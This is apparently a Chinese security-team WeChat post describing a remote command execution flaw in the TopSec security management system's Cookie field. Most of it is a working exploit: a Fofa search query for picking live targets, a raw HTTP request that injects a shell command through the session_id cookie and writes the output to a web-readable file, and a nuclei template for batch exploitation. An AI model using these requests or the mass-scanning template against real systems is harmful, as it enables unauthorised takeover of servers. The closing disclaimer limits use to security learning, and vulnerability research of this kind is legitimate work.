<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0oOWDTsxhrWDSes9IEUXCg)

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdEtAEtZGcoJE4iczXoaRSMicnxx2sMnpteMHDfOVYsfsmLlOVVicmkuyqX8xbnMHz28hVevCr0I431Q/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4UmjUxlibFXSRhbWEmJ3P9lSAgZLVR9hMHclcD7oKicJUoYcyhkzhxBMbZe92GugySF4I6SbbAUwKo0rXRKFSQhw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nYapuNoS1HavEwVy30V44qM2BXQhRr7PiaZmY1CWhvGhZPbctNWRpdibnhZcy2Atm1sSfibDccED4jGnGicqlRsbicw/640)

漏洞简介

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pfia87ibzS0exlZDnMymicrsI5vSomLEL4YF5dY7OFwqUY4bWtRuQqjOdIEqSfxP2TsiaFqCvjm99NhKMLK0cwZOtw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/94dQD66FqV0ehvY2ic2DJEswUeibqmrgXI5hvfCm0Ja0RyQ6DlSqRoJHJ9Wp7yxomWmJg7j16E3CrOvj1b3hkRTg/640)

天融信 TopSec 安全管理系统 Cookie 字段存在远程命令执行漏洞，通过该漏洞，攻击者可通过构造恶意字符串，执行任意系统命令，从而拿下服务器权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4UmjUxlibFXSRhbWEmJ3P9lSAgZLVR9hMHclcD7oKicJUoYcyhkzhxBMbZe92GugySF4I6SbbAUwKo0rXRKFSQhw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nYapuNoS1HavEwVy30V44qM2BXQhRr7PiaZmY1CWhvGhZPbctNWRpdibnhZcy2Atm1sSfibDccED4jGnGicqlRsbicw/640)

漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pfia87ibzS0exlZDnMymicrsI5vSomLEL4YF5dY7OFwqUY4bWtRuQqjOdIEqSfxP2TsiaFqCvjm99NhKMLK0cwZOtw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/94dQD66FqV0ehvY2ic2DJEswUeibqmrgXI5hvfCm0Ja0RyQ6DlSqRoJHJ9Wp7yxomWmJg7j16E3CrOvj1b3hkRTg/640)

步骤一：在 Fofa 中搜索以下语法并随机确定要进行攻击测试的目标....

```
# Fofa搜索语法
title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"

```

步骤二：开启代理并打开 BP 对其首页进行抓包拦截.... 修改请求头内容...

执行命令

```
GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: ip
Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/qqqq.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

```

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdEtAEtZGcoJE4iczXoaRSMic7evxBhBfgaicYJcH5o0S12Yvf249tIrzfdecicvMib8kbtdibXQHLfiaLdw/640?wx_fmt=png&from=appmsg)

查看结果

```
GET /site/image/qqqq.txt HTTP/1.1
Host:IP
Cookie: session_id_443=1
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

```

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdEtAEtZGcoJE4iczXoaRSMictS2Gp1vCzKEODHSYe2zf7OxicZvicicxYo4cyAKtuINRpctXJD5ph26ibw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4UmjUxlibFXSRhbWEmJ3P9lSAgZLVR9hMHclcD7oKicJUoYcyhkzhxBMbZe92GugySF4I6SbbAUwKo0rXRKFSQhw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nYapuNoS1HavEwVy30V44qM2BXQhRr7PiaZmY1CWhvGhZPbctNWRpdibnhZcy2Atm1sSfibDccED4jGnGicqlRsbicw/640)

批量脚本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pfia87ibzS0exlZDnMymicrsI5vSomLEL4YF5dY7OFwqUY4bWtRuQqjOdIEqSfxP2TsiaFqCvjm99NhKMLK0cwZOtw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/94dQD66FqV0ehvY2ic2DJEswUeibqmrgXI5hvfCm0Ja0RyQ6DlSqRoJHJ9Wp7yxomWmJg7j16E3CrOvj1b3hkRTg/640)

```
id: template-id
info:
  name: test_qrcode_b-rce
  author: kali
  severity: info
  description: description
  reference:
    - https://
  tags: tags
requests:
  - raw:
      # this request will be sent to \{\{Hostname\}\} to get the token
      - |
        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
        Host: \{\{Hostname\}\}
        Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/qqqq.txt;
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
      # This request will be sent instead to https://api.target.com:443 to verify the token validity
      - |
        @Host: \{\{Hostname\}\}
        GET /site/image/qqqq.txt HTTP/1.1
        Host: \{\{Hostname\}\}
        Cookie: session_id_443=1
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
    matchers:
      - type: word
        part: body
        words:
          - 'uid'
        condition: or

```

揽月安全团队发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！！！！！

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdEtAEtZGcoJE4iczXoaRSMicnmPMibxyv8GicJiblCwejxxe6zj692Lx0KpPNrq75IxWSCltwDicgIickKw/640?wx_fmt=png&from=appmsg)